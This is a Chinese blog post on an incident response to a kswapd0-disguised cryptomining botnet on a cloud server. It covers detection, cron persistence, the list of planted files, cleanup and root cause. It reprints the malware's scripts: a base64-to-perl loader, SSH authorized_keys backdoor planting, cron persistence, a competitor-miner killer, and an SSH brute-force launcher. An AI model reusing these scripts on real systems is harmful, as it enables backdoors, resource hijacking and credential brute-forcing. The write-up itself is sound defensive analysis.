---
title: 伪装为kswapd0进程的挖矿木马
categories:
- 系统安全
---
# 一、起因
腾讯云给我发了几封邮件说我的服务器被木马攻击。
![image.png](伪装为kswapd0进程的挖矿木马.assets\69c5affcdaa54e4e87c4bf8c7eb88a98.png)

我打开服务器监控一看，闲置的服务器CPU飙升。
![image.png](伪装为kswapd0进程的挖矿木马.assets\8bdd61431a61450eb6ca72de4047cd45.png)

# 二、排查
## 2.1 首先查询CPU占用最多的3个进程
**查使用内存最多的K个进程**

方式一：`ps -aux | sort -k3nr | head -K`
![image.png](伪装为kswapd0进程的挖矿木马.assets\41932a1a06c74682a1019e1b0e9f2338.png)

> **sort参数说明：**
>   |选项	|说明
>    |—————|—————————————————————————
>    |-n   |依照数值的大小排序，不加-n按字符串大小排序
>    |-r	  |以相反的顺序来排序
>    |-t	  |设置排序时所用的分隔字符
>    |-k   |指定需要排序的列
>    |-u   |去重

方式二：输入 `top` ，  然后输入大写P（输入大写M是按内存倒排）
![image.png](伪装为kswapd0进程的挖矿木马.assets\2207f43032d34d89aca11aa29c985562.png)

`最终发现是kswapd0进程在作乱。`

## 2.2 排查kswapd0进程
### 2.2.1 执行命令`netstat -antlp | grep kswapd0` 查询该进程的网络信息
```
[root@VM-0-13-centos etc]# netstat -antlp | grep kswapd0
tcp        0      0 172.17.0.13:55402       45.9.148.129:80         ESTABLISHED 31036/./kswapd0
```
发现一个与本机端口通信的是一个荷兰的ip。

<br>
### 2.2.2 执行命令`netstat -antlp | grep 45.9.148` 查询该地区ip的其他网络占用情况
```
[root@VM-0-13-centos etc]# netstat -antlp | grep 45.9.148
tcp        0      1 172.17.0.13:47182       45.9.148.99:443         SYN_SENT    31000/rsync         
tcp        0      0 172.17.0.13:55402       45.9.148.129:80         ESTABLISHED 31036/./kswapd0
```

发现还有一个rsync进程在工作。

执行 `ps -ef | grep 31000`
```
[root@VM-0-13-centos etc]# ps -ef | grep 31000
root     20734 28364  0 16:22 pts/1    00:00:00 grep --color=auto 31000
cj       31000     1  0 14:20 ?        00:00:00 rsync
```
确实有这个rsync进程在工作。

<br>
### 2.2.3 查找进程的详细信息
我们来到/proc/目录下查找对应的pid号，即/proc/31000和/proc/31036。可以在这两个目录下找到rsync进程和kswapd0进程的详细信息。

找到启动的脚本如下：
```
/proc/31000/exe -> /usr/bin/perl
/proc/31036/exe -> /tmp/.X25-unix/.rsync/a/kswapd0
```
>其实应该看看cmdline文件的，但是已经被我删了。

>/proc/pid/cmdline 进程启动命令
/proc/pid/cwd 链接到进程当前工作目录
/proc/pid/environ 进程环境变量列表
/proc/pid/exe 链接到进程的执行命令文件
/proc/pid/fd 包含进程相关的所有的文件描述符
/proc/pid/maps 与进程相关的内存映射信息
/proc/pid/mem 指代进程持有的内存,不可读
/proc/pid/root 链接到进程的根目录
/proc/pid/stat 进程的状态
/proc/pid/statm 进程使用的内存的状态
/proc/pid/status 进程状态信息,比stat/statm更具可读性
/proc/self 链接到当前正在运行的进程

<br>
### 2.2.4 在cj用户下查看定时任务 `crontab -l`
```
[cj@VM-0-13-centos ~]$ crontab -l
1 1 */2 * * /home/cj/.configrc/a/upd>/dev/null 2>&1
@reboot /home/cj/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /home/cj/.configrc/b/sync>/dev/null 2>&1
@reboot /home/cj/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1
```
还给我起了好多定时启动和重启启动的脚本。

#### 2.2.4.1 查看 /home/cj/.configrc/a/ 目录
**看一下upd脚本**
```
#!/bin/sh
cd /home/cj/.configrc/a
  if test -r /home/cj/.configrc/a/bash.pid; then
    pid=$(cat /home/cj/.configrc/a/bash.pid)
    if $(kill -CHLD $pid >/dev/null 2>&1); then
      exit 0
  fi
fi
./run &>/dev/null
```
>在脚本中检查了bash.pid是否存在且可读，如果存在读取该pid并杀死进程，如果杀死成功，则退出脚本，否则执行run脚本；
**bash.pid文件作用：**1. pid文件的内容：pid文件为文本文件，内容只有一行, 记录了该进程的ID。用cat命令可以看到。2. pid文件的作用：防止进程启动多个副本。只有获得pid文件(固定路径固定文件名)写入权限(F_WRLCK)的进程才能正常启动并把自身的PID写入该文件中。其它同一个程序的多余进程则自动退出。

<br>
**查看下run脚本**
```
#!/bin/bash
./stop
./init0
sleep 10
pwd > dir.dir
dir=$(cat dir.dir)
ARCH=`uname -m`
        if [ "$ARCH" == "i686" ]; then
                nohup ./anacron >>/dev/null &
        elif [ "$ARCH" == "x86_64" ];   then
                ./kswapd0
        fi
echo $! > bash.pid
```
>如果硬件类型是“i686”的话，就启动./anacron脚本；如果是“x86_64”的话，就启动万恶的kswapd0脚本。

**查看下kswapd0脚本**
```

```
>额，打不开，有大佬指点一下吗？


#### 2.2.4.2 查看 /home/cj/.configrc/b/ 目录
**查看sync脚本**
```
#!/bin/sh
cd /home/cj/.configrc/b
./run
```
>直接调用run脚本。

**查看run脚本**
```
#!/bin/sh
nohup ./stop>>/dev/null &
sleep 5
echo "yw5Ik......RPKjIhWyJCYEAAPzBJXX0=" | base64 --decode | perl
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAB......3K+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh
```
>原文件字符长度有4w多字，都是一些密钥信息，将不重要的密钥信息删减了大半。该脚本主要就是将公钥写到.ssh文件中，然后就可以控制计算机了。



<br>
# 三、解决
1. `crontab -e`删除木马创建的定时任务。包括/var/spool/cron和/etc/cron.d目录下的定时任务文件也要排查一下。
2. 删除所有木马创建的文件。主要是/tmp/.X25-unix/，cj/.configrc文件和被篡改的.ssh文件。(见<第五章>)
3. 杀死木马创建的所有进程。(见 <第五章>)

**如果该用户不重要，保险起见可以直接删除用户。**
查询所有用户
```
cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F":" '{ print $1"|"$3"|"$4 }'|more
```
删除用户及其对应的文件夹
```
userdel -r cj
```

<br>
# 四、分析原因
发现程序是跑在cj用户名下的，那就是我创建的普通用户cj的密码太简单了。最好还是使用密钥进行登陆，密码就那么几位，不保险。

但是为什么会知道我创建的用户名呢，想不明白。破解root用户不是更方便吗？

想起之前的一次Elasticsearch被攻击：部署的ELK集群，用于日志的采集和存储。但是发现每隔几天就会丢失数据，但是并没有人去删除这些日志，后来发现是被攻击了，Meow攻击使用自动脚本扫描开放的不安全的 Elasticsearch 和 MongoDB 数据库，找到之后直接将其删除。


<br>
# 五、总结
因为侵入的是我的普通用户cj，该用户下我没有进行过任何操作且该用户没有sudo权限。所以只要是cj用户下的进程都是挖矿的。

#### 木马启动的所有进程
```
cj       31000     1  0 14:20 ?        00:00:00 rsync
cj       31036     1 67 14:21 ?        01:37:01 ./kswapd0
cj       31328     1  0 14:22 ?        00:00:00 /bin/bash ./go
cj       31388 31328  0 14:22 ?        00:00:00 timeout 9h ./tsm -t 535 -f 1 -s 12 -S 9 -p 0 -d 1 p ip
cj       31389 31388  0 14:22 ?        00:00:00 /bin/bash ./tsm -t 535 -f 1 -s 12 -S 9 -p 0 -d 1 p ip
cj       31394 31389 27 14:22 ?        00:38:23 /tmp/.X25-unix/.rsync/c/lib/64/tsm --library-path /tmp/.X25-unix/.rsync/c/lib/64/ /usr/sbin/httpd rsync/c/tsm64 -t 535 -f 1 -s 12 -S 9 -p 0 -d 1 p ip
```
>kswapd0是挖矿程序，tsm是爆破程序。挖矿和爆破程序像病毒一样蔓延开来。

<br>
#### 木马启动的所有定时任务
```
[cj@VM-0-13-centos ~]$ crontab -l
1 1 */2 * * /home/cj/.configrc/a/upd>/dev/null 2>&1
@reboot /home/cj/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /home/cj/.configrc/b/sync>/dev/null 2>&1
@reboot /home/cj/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1
```

<br>
#### 木马创建的所有文件
**写了一个脚本来查询cj用户的所有文件，脚本如下**
`vim /root/searchfile.sh`
```sh
#!/bin/bash
if [ $1 ];then
  search_path=$1
else
  echo "ERROR: SEARCH_PATH LOSED! "
  exit 0
fi

if [ $2 ];then
  user=$2
else
  user=cj
fi

if [ $3 ];then
  target_path=$3
else
  target_path=/root/cjfile
fi

echo "" >> $target_path
echo "" >> $target_path
echo "------- $(date) ------" >> $target_path

search_user_file(){
  # get absolute path
  local DIRNAME=`cd $(dirname $1);pwd`
  local BASENAME=`basename $1`
  local init_path=$DIRNAME/$BASENAME
  echo "enter path => $init_path"

  #files=`ls -al $1 | awk -v user=$user -v dirs="" 'NF==9&&$9!="."&&$9!=".."&&$3==user{dirs=dirs" "$9} END{print dirs}'`
  local files=`ls -al $1 | awk -v user=$user -v dirs="" 'NF==9&&$9!="."&&$9!=".."{dirs=dirs" "$9} END{print dirs}'`

  echo "file => $files"

  if !(test -z "$files" );then
      
    for dir in $files;do
      local path=$init_path/$dir
      #echo $path
      if [ -d $path ];then
        search_user_file $path $2 $3  
      else
        local owner=`ls -l $path | awk '{print $3}'`
	#echo "------------------owner : $owner ------------------"
        if [ $owner = $2 ];then
          echo $path >> $3
        fi
      fi
    done

  fi
}

search_user_file $search_path $user $target_path
```
脚本目录下执行`./searchfile.sh /`，跑了十几分钟
**得到木马创建的所有文件如下**
```
------- Wed May 19 15:03:39 CST 2021 ------
/home/cj/.bash_history
/home/cj/.bash_logout
/home/cj/.bash_profile
/home/cj/.bashrc
/home/cj/.cache/abrt/lastnotification
/home/cj/.configrc/a/a
/home/cj/.configrc/a/bash.pid
/home/cj/.configrc/a/dir.dir
/home/cj/.configrc/a/init0
/home/cj/.configrc/a/kswapd0
/home/cj/.configrc/a/.procs
/home/cj/.configrc/a/run
/home/cj/.configrc/a/stop
/home/cj/.configrc/a/upd
/home/cj/.configrc/b/a
/home/cj/.configrc/b/dir.dir
/home/cj/.configrc/b/run
/home/cj/.configrc/b/stop
/home/cj/.configrc/b/sync
/home/cj/.configrc/dir2.dir
/home/cj/.ssh/authorized_keys
/home/cj/.viminfo
/tmp/.X25-unix/dota3.tar.gz
/tmp/.X25-unix/.rsync/1
/tmp/.X25-unix/.rsync/a/a
/tmp/.X25-unix/.rsync/a/init0
/tmp/.X25-unix/.rsync/a/kswapd0
/tmp/.X25-unix/.rsync/a/run
/tmp/.X25-unix/.rsync/a/stop
/tmp/.X25-unix/.rsync/b/a
/tmp/.X25-unix/.rsync/b/run
/tmp/.X25-unix/.rsync/b/stop
/tmp/.X25-unix/.rsync/c/1
/tmp/.X25-unix/.rsync/c/a
/tmp/.X25-unix/.rsync/c/aptitude
/tmp/.X25-unix/.rsync/c/dir.dir
/tmp/.X25-unix/.rsync/c/go
/tmp/.X25-unix/.rsync/c/golan
/tmp/.X25-unix/.rsync/c/lib/32/libc.so.6
/tmp/.X25-unix/.rsync/c/lib/32/libdl.so.2
/tmp/.X25-unix/.rsync/c/lib/32/libnss_dns.so.2
/tmp/.X25-unix/.rsync/c/lib/32/libnss_files.so.2
/tmp/.X25-unix/.rsync/c/lib/32/libpthread.so.0
/tmp/.X25-unix/.rsync/c/lib/32/libresolv-2.23.so
/tmp/.X25-unix/.rsync/c/lib/32/libresolv.so.2
/tmp/.X25-unix/.rsync/c/lib/32/tsm
/tmp/.X25-unix/.rsync/c/lib/64/libc.so.6
/tmp/.X25-unix/.rsync/c/lib/64/libdl.so.2
/tmp/.X25-unix/.rsync/c/lib/64/libnss_dns.so.2
/tmp/.X25-unix/.rsync/c/lib/64/libnss_files.so.2
/tmp/.X25-unix/.rsync/c/lib/64/libpthread.so.0
/tmp/.X25-unix/.rsync/c/lib/64/libresolv-2.23.so
/tmp/.X25-unix/.rsync/c/lib/64/libresolv.so.2
/tmp/.X25-unix/.rsync/c/lib/64/tsm
/tmp/.X25-unix/.rsync/c/n
/tmp/.X25-unix/.rsync/c/run
/tmp/.X25-unix/.rsync/c/scan.log
/tmp/.X25-unix/.rsync/c/slow
/tmp/.X25-unix/.rsync/c/start
/tmp/.X25-unix/.rsync/c/stop
/tmp/.X25-unix/.rsync/c/tsm
/tmp/.X25-unix/.rsync/c/tsm32
/tmp/.X25-unix/.rsync/c/tsm64
/tmp/.X25-unix/.rsync/c/v
/tmp/.X25-unix/.rsync/c/watchdog
/tmp/.X25-unix/.rsync/dir.dir
/tmp/.X25-unix/.rsync/init
/tmp/.X25-unix/.rsync/init2
/tmp/.X25-unix/.rsync/initall
/tmp/.X25-unix/.rsync/.out
/tmp/up.txt
/var/spool/cron/cj
/var/spool/mail/cj
/var/tmp/.systemcache436621
```
>a目录下存放shellbot后门，b目录下存放挖矿木马，c目录下存放SSH爆破攻击程序。


<br>
#### 查看历史命令和登陆
**执行`history`查看历史命令**
发现所有的历史命令都没有了，可能是脚本已经自动清除了。

**执行`last`查看近期登录的帐户记录**
发现没有cj登陆记录，应该也被清除了。

**执行`/var/log/secure|grep 'Accepted'`查看成功登录的ip**
```
[root@VM-0-13-centos tmp]# less /var/log/secure|grep 'Accepted'
May 18 13:57:27 VM-0-13-centos sshd[24567]: Accepted password for cj from 42.192.205.184 port 33090 ssh2
```
发现了`42.192.205.184`这个IP在下午`13:57:27`成功登录了这个云，这个时间和up.txt文件创建的时间相同。那就是这个IP破解了我的密码，IP地址在上海。可能也是被木马黑掉的服务器吧。
>国外的服务器延迟高，但是带宽大，国内的带宽小，但是延迟低。传输需要大带宽，破解需要小延迟，所以想想这么配置很合理。


<br>
# 六、脚本执行顺序
## 6.1 /home/cj/.configrc/a/下的脚本

**Install**
```
#!/bin/sh
rm -rf /tmp/.FILE
rm -rf /tmp/.FILE*
rm -rf /dev/shm/.FILE*
rm -rf /dev/shm/.FILE
rm -rf /var/tmp/.FILE
rm -rf /var/tmp/.FILE*
rm -rf /tmp/nu.sh
rm -rf /tmp/nu.*
rm -rf /dev/shm/nu.sh
rm -rf /dev/shm/nu.*
rm -rf /tmp/.F*
rm -rf /tmp/.x*
rm -rf /tmp/tdd.sh

pkill -9 go> .out
pkill -9 run> .out
pkill -9 tsm> .out
kill -9 `ps x|grep run|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep go|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep tsm|grep -v grep|awk '{print $1}'`> .out

killall -9 xmrig
killall -9 ld-linux
kill -9 `ps x|grep xmrig|grep -v grep|awk '{print $1}'`
kill -9 `ps x|grep ld-linux|grep -v grep|awk '{print $1}'`
cat init | bash

sleep 10
cd ~
pwd > dir.dir
dir=$(cat dir.dir)
if [ -d "$dir/.bashtemprc2" ]; then
	exit 0
else
	cat init2 | bash
fi
exit 0
```
>执行dota/.rsync/initall，Install做一些清理准备工作后，执行init功能。

**Init**
```
pkill -9 go> .out
pkill -9 run> .out
pkill -9 tsm> .out
kill -9 `ps x|grep run|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep go|grep -v grep|awk '{print $1}'`> .out
kill -9 `ps x|grep tsm|grep -v grep|awk '{print $1}'`> .out

pwd > dir.dir
dir=$(cat dir.dir)
cd $dir
chmod 777 *

rm -rf cron.d
rm -rf ~/.nullcach*
rm -rf ~/.firefoxcatch*
rm -rf ~/.bashtem*
rm -rf ~/.configrc*
mkdir ~/.configrc
cp -r a ~/.configrc/
cp -r b ~/.configrc/

cd ~/.configrc/a/
nohup ./init0 >> /dev/null &
sleep 5s
nohup ./a >>/dev/null &
cd ~/.configrc/b/
nohup ./a >>/dev/null &

cd $dir
cd c
nohup ./start >>/dev/null &
cd ~/.configrc/
pwd > dir2.dir
dir2=$(cat dir2.dir)

echo "1 1 */2 * * $dir2/a/upd>/dev/null 2>&1
@reboot $dir2/a/upd>/dev/null 2>&1
5 8 * * 0 $dir2/b/sync>/dev/null 2>&1
@reboot $dir2/b/sync>/dev/null 2>&1  
0 0 */3 * * $dir/c/aptitude>/dev/null 2>&1" >> cron.d

sleep 3s

rm -rf ~/ps
rm -rf ~/ps.*

crontab cron.d
crontab -l
```
>Init中清理自身挖矿进程，写入定时任务


<br>
接着执行dota/.rsync/a/a，a脚本执行init0，就如注释所言，杀死加密矿工的脚本，结束竞品的shell程序，挖矿程序启动后会结束大部分挖矿软件的进程,并删除其他挖矿软件相关文件，独占资源。
**init0**
```
#!/bin/sh

##########################################################################################\
### A script for killing cryptocurrecncy miners in a Linux enviornment
### Provided with zero liability (!)
###
### Some of the malware used as sources for this tool:
### https://pastebin.com/pxc1sXYZ
### https://pastebin.com/jRerGP1u
### SHA256: 2e3e8f980fde5757248e1c72ab8857eb2aea9ef4a37517261a1b013e3dc9e3c4
##########################################################################################\

# Killing processes by name, path, arguments and CPU utilization
processes(){
	killme() {
	  killall -9 chron-34e2fg;ps wx|awk '/34e|r\/v3|moy5|defunct/' | awk '{print $1}' | xargs kill -9 & > /dev/null &
	}

	killa() {
	what=$1;ps auxw|awk "/$what/" |awk '!/awk/' | awk '{print $2}'|xargs kill -9&>/dev/null&
	}

	killa 34e2fg
	killme
	
	# Killing big CPU
	VAR=$(ps uwx|awk '{print $2":"$3}'| grep -v CPU)
	for word in $VAR
	do
	  CPUUSAGE=$(echo $word|awk -F":" '{print $2}'|awk -F"." '{ print $1}')
	  if [ $CPUUSAGE -gt 45 ]; then echo BIG $word; PID=$(echo $word | awk -F":" '{print $1'});LINE=$(ps uwx | grep $PID);COUNT=$(echo $LINE| grep -P "er/v5|34e2|Xtmp|wf32N4|moy5Me|ssh"|wc -l);if [ $COUNT -eq 0 ]; then echo KILLING $line; fi;kill $PID;fi;
	done

	killall \.Historys
	killall \.sshd
	killall neptune
	killall xm64
	killall xm32
	killall ld-linux
	killall xmrig
	killall \.xmrig
	killall suppoieup

	pkill -f sourplum
	pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
	
	ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "119.9.76.107:443"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmrigDaemon" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmrigMiner" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "/var/tmp/java" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "/var/tmp/sustes" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "ld-linux" | awk '{print $2}'|xargs kill -9

	ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
	ps auxf|grep Donald| awk '{print $2}'|xargs kill -9
	ps auxf|grep Macron| awk '{print $2}'|xargs kill -9
	ps auxf|grep ld-linux| awk '{print $2}'|xargs kill -9

	ps auxf|grep named| awk '{print $2}'|xargs kill -9
	ps auxf|grep kernelcfg| awk '{print $2}'|xargs kill -9
	ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
	ps auxf|grep kernelupgrade| awk '{print $2}'|xargs kill -9
	ps auxf|grep kernelorg| awk '{print $2}'|xargs kill -9
	ps auxf|grep kernelupdates| awk '{print $2}'|xargs kill -9

	ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
	ps ax|grep -o './[0-9]* -c'| xargs pkill -f

	pkill -f /usr/bin/.sshd
	pkill -f acpid
	pkill -f Donald
	pkill -f Macron
	pkill -f AnXqV.yam
	pkill -f apaceha
	pkill -f askdljlqw
	pkill -f bashe
	pkill -f bashf
	pkill -f bashg
	pkill -f bashh
	pkill -f bashx
	pkill -f BI5zj
	pkill -f biosetjenkins
	pkill -f bonn.sh
	pkill -f bonns
	pkill -f conn.sh
	pkill -f conns
	pkill -f cryptonight
	pkill -f crypto-pool
	pkill -f ddg.2011
	pkill -f deamon
	pkill -f disk_genius
	pkill -f donns
	pkill -f Duck.sh
	pkill -f gddr
	pkill -f Guard.sh
	pkill -f i586
	pkill -f icb5o
	pkill -f ir29xc1
	pkill -f irqba2anc1
	pkill -f irqba5xnc1
	pkill -f irqbalanc1
	pkill -f irqbalance
	pkill -f irqbnc1
	pkill -f JnKihGjn
	pkill -f jweri
	pkill -f kw.sh
	pkill -f kworker34
	pkill -f kxjd
	pkill -f libapache
	pkill -f Loopback
	pkill -f lx26
	pkill -f mgwsl
	pkill -f minerd
	pkill -f minergate
	pkill -f minexmr
	pkill -f mixnerdx
	pkill -f mstxmr
	pkill -f nanoWatch
	pkill -f nopxi
	pkill -f NXLAi
	pkill -f performedl
	pkill -f polkitd
	pkill -f pro.sh
	pkill -f pythno
	pkill -f qW3xT.2
	pkill -f sourplum
	pkill -f stratum
	pkill -f sustes
	pkill -f wnTKYg
	pkill -f XbashY
	pkill -f XJnRj
	pkill -f xmrig
	pkill -f xmrigDaemon
	pkill -f xmrigMiner
	pkill -f ysaydh
	pkill -f zigw
	pkill -f ld-linux
	
	# crond
	ps ax | grep crond | grep -v grep | awk '{print $1}' > /tmp/crondpid
	while read crondpid
	do
		if [ $(echo  $(ps -p $crondpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
		then
			kill $crondpid
			rm -rf /var/tmp/v3
		fi
	done < /tmp/crondpid
	rm /tmp/crondpid -f
	 
	# sshd
	ps ax | grep sshd | grep -v grep | awk '{print $1}' > /tmp/ssdpid
	while read sshdpid
	do
		if [ $(echo  $(ps -p $sshdpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
		then
			kill $sshdpid
		fi
	done < /tmp/ssdpid
	rm -f /tmp/ssdpid

	# syslog
	ps ax | grep syslogs | grep -v grep | awk '{print $1}' > /tmp/syslogspid
	while read syslogpid
	do
		if [ $(echo  $(ps -p $syslogpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
		then
			kill  $syslogpid
		fi
	done < /tmp/syslogspid
	rm /tmp/syslogspid -f

		ps x | grep 'b 22'| awk '{print $1,$5}' > .procs

		cat .procs | while read line
		do

		pid=`echo $line | awk '{print $1;}'`
		name=`echo $line | awk '{print $2;}'`
		#echo $pid $name 

		if [ $(echo $name | wc -c) -lt "13" ]
			then
			echo "Found" $pid $name
			kill -9 $pid
		fi
		done

		####################################################


		ps x | grep 'd 22'| awk '{print $1,$5}' > .procs

		cat .procs | while read line
		do

		pid=`echo $line | awk '{print $1;}'`
		name=`echo $line | awk '{print $2;}'`
		#echo $pid $name 

		if [ $(echo $name | wc -c) -lt "13" ]
			then
			echo "Found" $pid $name
			kill -9 $pid
		fi
		done

}


# Removing miners by known path IOC
files(){
	rm /tmp/.cron
	rm /tmp/Donald*
	rm /tmp/Macron*
	rm /tmp/.main
	rm /tmp/.yam* -rf
	rm -f /tmp/irq
	rm -f /tmp/irq.sh
	rm -f /tmp/irqbalanc1
	rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
	rm -rf /tmp/*httpd.conf
	rm -rf /tmp/*httpd.conf*
	rm -rf /tmp/*index_bak*
	rm -rf /tmp/.systemd-private-*
	rm -rf /tmp/.xm*
	rm -rf /tmp/a7b104c270
	rm -rf /tmp/conn
	rm -rf /tmp/conns
	rm -rf /tmp/httpd.conf
	rm -rf /tmp/java*
	rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json /var/tmp/kworkerds /var/tmp/config.json /usr/local/lib/libjdk.so
	rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
	rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
	rm -rf /tmp/xm*
	rm -rf /var/tmp/java*
}

# Killing and blocking miners by network related IOC
network(){
	# Kill by known ports/IPs
	netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep 140.82.52.87 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep 119.9.76.107 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :23 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :143 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :2222 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :3389 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :6665 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :6667 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :8444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
}	

files
processes
network
echo "DONE"
```

**然后判断平台类型，如果是"i686"就执行anacron，anacron是基于xmrig2.14修改的linux平台挖矿木马；如果是x86_64就启动./kswapd0。**

**然后执行dota/.rsync/b/a，b/a最终执行ps，ps是上面讲的ssh后门服务端，方便黑客远程免密ssh登录。**

**接着执行c目录的start，联网下载要爆破的服务器地址，端口，以及一些字典。**
```
#!/bin/sh
pwd > dir.dir
dir=$(cat dir.dir)
cd $dir
chmod 777 *
rm -rf n
echo "1">n

echo "#!/bin/sh
cd $dir
./run &>/dev/null" > aptitude
chmod u+x aptitude
chmod 777 *
./aptitude >> /dev/null &

exit 0
```

**一直追下去，发现在go脚本中启动了tsm脚本，执行目录下的tsm传入要爆破的IP和字典**
```
#!/bin/bash
dir=`pwd`
cd $dir

threads=535

ARCH=`uname -m`
if [[ "$ARCH" =~ ^arm ]]; then
	threads=75
fi



		while :
		do
		touch v
		rm -rf p
		rm -rf ip
		rm -rf xtr*
		rm -rf a a.*
		rm -rf b b.*
		
		sleep $[ ( $RANDOM % 30 )  + 1 ]s
		timeout 9h ./tsm -t $threads -f 1 -s 12 -S 9 -p 0 -d 1 p ip

		sleep 3
		rm -rf xtr*
		rm -rf ip
		rm -rf p
		rm -rf .out
		rm -rf /tmp/t*
		done
exit 0
```

**tsm脚本**
```
#!/bin/bash
SCRIPT_PATH=$(dirname $(readlink -f $0))
ARCH=`uname -m`
if [ "$ARCH" == "i686" ]; then
	$SCRIPT_PATH/lib/32/tsm --library-path $SCRIPT_PATH/lib/32/ $SCRIPT_PATH/tsm32 $*
elif [ "$ARCH" == "x86_64" ];   then		
	$SCRIPT_PATH/lib/64/tsm --library-path $SCRIPT_PATH/lib/64/ $SCRIPT_PATH/tsm64 $*
fi
```

<br>
# 参考
[腾讯官方分析 https://www.freebuf.com/articles/network/205384.html](https://www.freebuf.com/articles/network/205384.html)
[问题排查https://cloud.tencent.com/document/product/296/9604](https://cloud.tencent.com/document/product/296/9604)
